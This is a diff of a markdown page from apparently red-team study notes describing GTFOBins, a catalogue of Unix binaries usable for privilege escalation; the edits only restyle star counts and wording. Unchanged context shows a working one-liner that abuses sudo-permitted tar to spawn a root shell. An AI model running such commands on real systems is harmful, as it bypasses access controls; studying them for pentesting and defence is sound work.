@@ -2,7 +2,7 @@
 
 <div class="row row-cols-lg-2"><div>
 
-**[GTFOBins](https://gtfobins.github.io/)** (9.5k ⭐) a.k.a. "Get The Fuck Out" is a list of way to exploit binaries such as `sed`/`tar`/... to get root.
+[GTFOBins](https://gtfobins.github.io/) <small>(10.0k ⭐)</small> a.k.a. "Get The Fuck Out" is a list of way to exploit binaries such as `sed`/`tar`/... to get a higher level of privileges.
 
 Common use cases are:
 
@@ -22,7 +22,7 @@ You can only run `tar` using `sudo`. Run the command below from [GTFOBins](https
 $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 
-➡️ You can use [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup) (0.2k ⭐) for offline browsing.
+➡️ You can use [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup) <small>(0.2k ⭐)</small> for offline browsing.
 
 ➡️ You may need/want to create a [root bash](/cybersecurity/red-team/s4.privesc/linux/utils/rootbash.md).
 </div></div>
